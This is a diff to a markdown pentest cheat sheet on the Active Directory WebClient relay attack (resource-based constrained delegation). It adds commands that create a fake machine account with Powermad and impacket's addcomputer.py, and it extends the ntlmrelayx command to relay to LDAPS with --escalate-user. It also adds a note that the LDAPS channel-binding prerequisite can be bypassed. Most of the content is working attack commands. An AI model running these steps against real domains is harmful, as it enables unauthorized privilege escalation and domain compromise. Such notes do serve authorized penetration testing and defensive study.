@@ -866,11 +866,11 @@ dir \\<COMPUTER>\C$
 ### Webclient Attack
 - Requirements:
   - On a Domain Controller to have the LDAP server signing not enforced (default value)
-  - On a Domain Controller to have the LDAPS channel binding not required (default value)
   - Able to add new machines accounts (default value this quota is 10)
   - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity)
   - A DNS record pointing to the attacker’s machine (By default authenticated users can do this)
 - https://www.bussink.net/rbcd-webclient-attack/
+- The blog says this is a requirement but it isn't "On a Domain Controller to have the LDAPS channel binding not required (default value)" if you create the user yourself and use the ```--escalate-user``` flag.
 
 #### Check who can add computers to the domain
 ```
@@ -926,9 +926,19 @@ Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> 
 ```
 - Didn't test powershell invoke-dnsupdate for this attack
 
+#### Create a new computer object
+- https://github.com/Kevin-Robertson/Powermad
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
+```
+import-module powermad
+New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+
+python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
+```
+
 #### start NTLMRelay
 ```
-sudo ntlmrelayx.py -t ldaps://<DC IP> --http-port 8080 --delegate-access 
+sudo ntlmrelayx.py -t ldaps://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
 ```
 
 #### Trigger target to authenticate to attacker machine
